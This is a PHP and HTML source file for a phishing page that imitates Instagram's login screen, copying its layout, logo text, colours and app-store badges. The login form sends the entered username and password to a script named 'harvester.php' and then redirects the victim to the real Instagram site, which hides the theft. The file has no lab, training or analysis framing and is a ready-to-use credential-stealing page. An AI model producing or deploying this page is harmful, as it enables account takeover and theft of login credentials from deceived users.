<?php
require_once __DIR__ . '/config.php';
$cfg = require __DIR__ . '/config.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instagram</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fafafa;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.wrap{width:350px;max-width:100%}
.card{background:#fff;border:1px solid #dbdbdb;padding:40px 40px 20px;margin-bottom:10px;text-align:center}
.logo{font-family:"Billabong","Segoe Script",cursive;font-size:48px;margin-bottom:24px;color:#262626}
.card input{width:100%;padding:9px 8px;margin-bottom:6px;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:12px}
.card button{width:100%;background:#0095f6;color:#fff;border:none;padding:7px 16px;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer;margin-top:8px}
.card button:hover{background:#1877f2}
.divider{display:flex;align-items:center;margin:18px 0;color:#8e8e8e;font-size:13px;font-weight:600}
.divider::before,.divider::after{content:"";flex:1;height:1px;background:#dbdbdb}
.divider span{padding:0 18px}
.fb{color:#385185;font-size:14px;font-weight:600;text-decoration:none;display:block;margin:8px 0}
.forgot{color:#00376b;font-size:12px;text-decoration:none;display:block;margin-top:12px}
.signup{background:#fff;border:1px solid #dbdbdb;padding:20px;text-align:center;font-size:14px}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
.apps p{text-align:center;font-size:14px;margin:20px 0 12px}
.apps .badges{display:flex;gap:8px;justify-content:center}
.apps .badges img{height:40px}
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <div class="logo">Instagram</div>
    <form method="POST" action="harvester.php?next=https://www.instagram.com">
      <input type="text" name="username" placeholder="Phone number, username, or email" autocomplete="username" required>
      <input type="password" name="pass" placeholder="Password" autocomplete="current-password" required>
      <button type="submit">Log In</button>
    </form>
    <div class="divider"><span>OR</span></div>
    <a class="fb" href="#">Log in with Facebook</a>
    <a class="forgot" href="#">Forgot password?</a>
  </div>
  <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
  <div class="apps">
    <p>Get the app.</p>
    <div class="badges">
      <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Yb-Klz.png" alt="App Store" onerror="this.style.display='none'">
      <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" onerror="this.style.display='none'">
    </div>
  </div>
</div>
</body>
</html>
